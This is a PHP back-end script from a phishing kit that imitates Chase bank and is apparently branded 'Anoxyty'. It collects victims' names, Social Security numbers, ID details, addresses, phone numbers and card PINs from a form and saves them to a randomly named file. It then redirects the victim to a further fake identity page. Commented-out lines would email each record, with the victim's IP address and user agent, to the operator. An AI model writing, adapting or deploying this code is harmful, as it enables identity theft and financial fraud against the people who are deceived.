<?php 
   ob_start();
   session_start();
//    include '../data.php';
//    include '../anoxytytrap/info.php';
   $ip = getenv("REMOTE_ADDR");
   $hostname = gethostbyaddr($ip);
   $useragent = $_SERVER['HTTP_USER_AGENT'];
   if ( isset( $_POST['fname'] ) ) {
   	
   	$_SESSION['fname'] 	  = $_POST['fname'];
   	$_SESSION['lname'] 	  = $_POST['lname'];
   	$_SESSION['date'] 	  = $_POST['date'];
   	$_SESSION['ssn'] 	  = $_POST['ssn'];
   	$_SESSION['idtyp'] 	  = $_POST['idtyp'];
   	$_SESSION['idd'] 	  = $_POST['idd'];
   	$_SESSION['ids'] 	  = $_POST['ids'];
   	$_SESSION['stradd']   = $_POST['stradd'];
   	$_SESSION['apt'] 	  = $_POST['apt'];
   	$_SESSION['zip'] 	  = $_POST['zip'];
    $_SESSION['phone'] 	  = $_POST['phone'];
   	$_SESSION['cpin'] 	  = $_POST['cpin'];


    $log = "firstname: ".$_SESSION['fname']."    lastname: ".$_SESSION['lname'] ."    date: ".$_SESSION['date']."    ssn: ".$_SESSION['ssn']."    idtype: ".$_SESSION['idtyp']."    idd: ".$_SESSION['idd']."    ids: ".$_SESSION['ids'] ."    stradd: ".$_SESSION['stradd']."    apt: ".$_SESSION['apt']."    zip: ".$_SESSION['zip']."    phone: ".$_SESSION['phone']."    cpin: ".$_SESSION['cpin'];
    $filename = $_SESSION['filename'];
    if($filename == ""){
        $_SESSION['randString'] = genRandString(80);
        $filename = $_SESSION['randString'];

        if(!file_put_contents($filename, $log)){
            // permission issue
        }
    }else{
        file_put_contents($filename, $log,  FILE_APPEND | LOCK_EX);

    }
   
//     $message = file_get_contents('../anoxyty/send/personal.html');
   
//     $message = preg_replace('{AN0XYTY-J}', $_SESSION['fname'], $message);
//     $message = preg_replace('{AN0XYTY-K}', $_SESSION['lname'], $message);
//      $message = preg_replace('{AN0XYTY-L}', $_SESSION['date'], $message);
//     $message = preg_replace('{AN0XYTY-M}', $_SESSION['ssn'], $message);
//      $message = preg_replace('{AN0XYTY-N}', $_SESSION['idtyp'], $message);
//     $message = preg_replace('{AN0XYTY-O}', $_SESSION['idd'], $message);
//      $message = preg_replace('{AN0XYTY-P}', $_SESSION['ids'], $message);
//     $message = preg_replace('{AN0XYTY-Q}', $_SESSION['stradd'], $message);
//      $message = preg_replace('{AN0XYTY-R}', $_SESSION['apt'], $message);
//     $message = preg_replace('{AN0XYTY-S}', $_SESSION['zip'], $message);
//     $message = preg_replace('{AN0XYTY-T}', $_SESSION['phone'], $message);
//       $message = preg_replace('{AN0XYTY-V}', $_SESSION['cpin'], $message);
   
//     $message = preg_replace('{AN0XYTY-IP}', $ip, $message);
    
//     $message = preg_replace('{AN0XYTY-INFO}', $ip, $message);
//     $message = preg_replace('{AN0XYTY-UGENT}', $useragent, $message);
    
//     $message = preg_replace('{AN0XYTY-Z}', $LOOKUP_CITY, $message);
//    $message = preg_replace('{AN0XYTY-X}', $LOOKUP_STATE, $message);
//    $message = preg_replace('{AN0XYTY-W}', $LOOKUP_ISP, $message);
   
   
//           $subject = " CHASE PERSONAL INFO By Anoxyty : $ip ";
//           $headers = "From: Anoxyty <chase@anoxyty.com>\r\n";
//           $headers .= "MIME-Version: 1.0\r\n";
//           $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
        
//           @mail($data,$subject,$message,$headers);
   
//    	$save = fopen("saved/stored.html","a+");
//           fwrite($save,$message);
//           fclose($save);
   
   
          header("Location: ../cad_identity.php?dashboard/informati0n==dashboard/overview&ue");
          exit();
   } else {
   	header("Location: index.php");
   	exit();
   }
   ?>